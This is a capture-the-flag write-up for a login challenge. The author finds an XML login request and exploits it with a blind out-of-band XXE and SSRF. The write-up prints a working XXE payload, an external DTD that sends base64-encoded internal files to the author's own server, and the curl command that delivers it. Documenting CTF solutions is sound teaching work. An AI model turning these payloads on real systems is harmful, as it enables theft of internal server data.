# Secret Recipe 2

```
Another login page... however it seems that the developers learned from their last mistake.

http://challenges.tacocon.party:8123
*Please no brute-forcing... this will get you nowhere.
```

This website has two fields with a "Check stock" on it. It's probably dumb luck that I tried "admin" "admin" in the two fields and received the following message:

```
Hello Admin!

Remember, instead of showing the secret recipe here we moved it to that server on the local network (secret_server).

We are stepping up our security! We can't have our secret sauce being potentially exposed to everyone!
```

Interesting...a "secret_server"? How am i supposed to access that? Well, looking at how the web request happens, it's actually sending a request to check_login.php with a payload of "<creds><user>admin</user><pass>admin</pass></creds>"

It took me a while to realize that you can exploite the XML parser that parses these types of payloads. This is called an XXE. I created a payload containing the following:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=http://secret_server/data/secret.json">
  <!ENTITY % dtd SYSTEM "http://alexloney.com/oob.dtd">

%dtd;
%all;
%req;
]>
<creds>
    <user>admin</user>
    <pass>admin</pass>
    <foo>&xxe;</foo>
</creds>
```

Along with a file on my website located at "http://alexloney.com/oob.dtd" which contained the following:

```
<!ENTITY % all "<!ENTITY &#x25; req SYSTEM 'http://alexloney.com/xss.php?%file;'>"> 
```

And sent the original payload with the following:

```
curl -d @xxe.xml 'http://challenges.tacocon.party:8123/check_login.php' 
```

Now, I'm making this sound a LOT easier than it actually was. In reality, it took me a long time and a lot of googling to figure out the XXE payload structure and usage. Furthermore, I was receiving a lot of errors with the secure_server not being formatted correctly for XML or the URI not being formatted correctly to send the data back.

I had to eventually figure out how to invoke PHP to base64 encode the returned data from secure_server and send that back. I then had to repeat this attack a few times as it was listing the directories to find the correct path on the secure_server. So I'd request a page, receive the base64 webpage, decode it and figure out the next path. I eventually figured out the full path and received the following flag.

```
Tacocon{SSRFisPrettyNeat&SoAreTacos}
```
